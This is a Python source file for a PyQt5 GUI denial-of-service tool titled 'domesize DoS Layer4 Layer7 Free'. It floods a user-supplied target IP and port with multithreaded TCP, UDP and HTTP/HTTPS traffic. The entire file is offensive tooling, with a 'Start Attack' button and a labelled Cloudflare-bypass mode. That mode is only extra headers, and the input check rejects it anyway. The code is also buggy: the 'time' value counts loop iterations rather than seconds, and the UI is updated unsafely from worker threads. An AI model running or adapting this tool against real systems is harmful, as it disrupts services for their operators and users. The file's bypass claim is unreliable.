import requests
import threading
import socket
import time
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QPushButton, QTextEdit, QLabel, QLineEdit, QHBoxLayout, QComboBox
from PyQt5.QtCore import QTimer, Qt
import sys
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

def attack_http_bypass_cf(target_ip, target_port, attack_time):
    url = f"http://{target_ip}:{target_port}" 
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Referer": f"http://{target_ip}",
        "Origin": f"http://{target_ip}",
    }

    session = requests.Session()

    retries = Retry(total=5, backoff_factor=0.3, status_forcelist=[500, 502, 503, 504])
    session.mount("http://", HTTPAdapter(max_retries=retries))
    session.mount("https://", HTTPAdapter(max_retries=retries))

    for _ in range(attack_time):
        try:
            response = session.get(url, headers=headers, timeout=5)
            if response.status_code == 200:
                status = f"HTTP Attack: {url} - Status: {response.status_code}"
            else:
                status = f"HTTP Attack: {url} - Status Code: {response.status_code}"
            print(status)
            update_status(status)
        except requests.exceptions.RequestException as e:
            status = f"Error during attack: {e}"
            print(status)
            update_status(status)

def attack_https(target_ip, target_port, attack_time):
    url = f"https://{target_ip}:{target_port}"  
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}

    for _ in range(attack_time):
        try:
            response = requests.get(url, headers=headers, timeout=1)
            status = f"HTTPS Attack: {url} - Status: {response.status_code}"
            print(status)
            update_status(status)
        except requests.exceptions.RequestException as e:
            status = f"Error during attack: {e}"
            print(status)
            update_status(status)

def attack_udp(target_ip, target_port, attack_time):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = b'UDP Attack' 
    target_port = int(target_port)

    for _ in range(attack_time):
        try:
            sock.sendto(message, (target_ip, target_port)) 
            status = f"UDP Attack: {target_ip}:{target_port} - Sending..."
            print(status)
            update_status(status)
        except socket.timeout:
            status = f"Timeout while attacking {target_ip}:{target_port}"
            print(status)
            update_status(status)
        except Exception as e:
            status = f"Error: {e}"
            print(status)
            update_status(status)
    
    sock.close()

def attack_tcp(target_ip, target_port, attack_time):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1) 
    target_port = int(target_port)

    try:
        sock.connect((target_ip, target_port))  
        status = f"TCP Attack: {target_ip}:{target_port} - Connected!"
        print(status)
        update_status(status)

        for _ in range(attack_time):
            try:
                sock.send(b'TCP Attack')  
                status = f"Sending to {target_ip}:{target_port}..."
                print(status)
                update_status(status)
            except socket.error as e:
                status = f"Error during attack: {e}"
                print(status)
                update_status(status)
                break 
    except socket.error as e:
        status = f"Error connecting to {target_ip}:{target_port} - {e}"
        print(status)
        update_status(status)
    finally:
        sock.close() 

def update_ui():
    output = "\n"

    ui.textEdit.setText(output)

def update_status(status):
    ui.textEdit.append(status)

def shoot_attack():
    target_ip = ui.ip_input.text()
    target_port = ui.port_input.text()

    attack_time_text = ui.time_input.text()
    if not attack_time_text.isdigit(): 
        status = "Error: Please enter a valid number for time."
        print(status)
        update_status(status)
        return

    attack_time = int(attack_time_text)  
    attack_type = ui.attack_type_combo.currentText()  

    if attack_type not in ["TCP", "UDP", "HTTPS"]:
        status = "Error: Please select a valid attack type."
        print(status)
        update_status(status)
        return

    threads = []

    if attack_type == "TCP":
        num_threads = 50
    elif attack_type == "UDP":
        num_threads = 100
    elif attack_type == "HTTPS":
        num_threads = 5  

    for _ in range(num_threads):
        if attack_type == "TCP":
            t = threading.Thread(target=attack_tcp, args=(target_ip, target_port, attack_time))
        elif attack_type == "UDP":
            t = threading.Thread(target=attack_udp, args=(target_ip, target_port, attack_time))
        elif attack_type == "HTTPS":
            t = threading.Thread(target=attack_https, args=(target_ip, target_port, attack_time))
        elif attack_type == "HTTPSBYPASS-CLOUDFLARE":
            t = threading.Thread(target=attack_http_bypass_cf, args=(target_ip, target_port, attack_time))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

class App(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()
    
    def init_ui(self):
        self.setWindowTitle('domesize DoS Layer4 Layer7 Free')

        layout = QVBoxLayout()

        input_layout = QHBoxLayout()
        self.ip_input = QLineEdit(self)
        self.ip_input.setPlaceholderText('Enter Target IP')
        self.port_input = QLineEdit(self)
        self.port_input.setPlaceholderText('Enter Target Port')
        self.time_input = QLineEdit(self)
        self.time_input.setPlaceholderText('Enter Time (seconds)')
        input_layout.addWidget(self.ip_input)
        input_layout.addWidget(self.port_input)
        input_layout.addWidget(self.time_input)

        layout.addLayout(input_layout)

        self.attack_type_label = QLabel("Select Attack Type:", self)
        self.attack_type_combo = QComboBox(self)
        self.attack_type_combo.addItems(["TCP", "UDP", "HTTPS","HTTPSBYPASS-CLOUDFLARE"])

        layout.addWidget(self.attack_type_label)
        layout.addWidget(self.attack_type_combo)

        self.shoot_button = QPushButton('Start Attack', self)
        self.shoot_button.clicked.connect(shoot_attack)
        layout.addWidget(self.shoot_button)

        self.textEdit = QTextEdit(self)
        self.textEdit.setReadOnly(True)
        layout.addWidget(self.textEdit)

        self.setLayout(layout)

        self.timer = QTimer(self)
        self.timer.timeout.connect(update_ui)
        self.timer.start(2000)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    ui = App()
    ui.show()
    sys.exit(app.exec_())
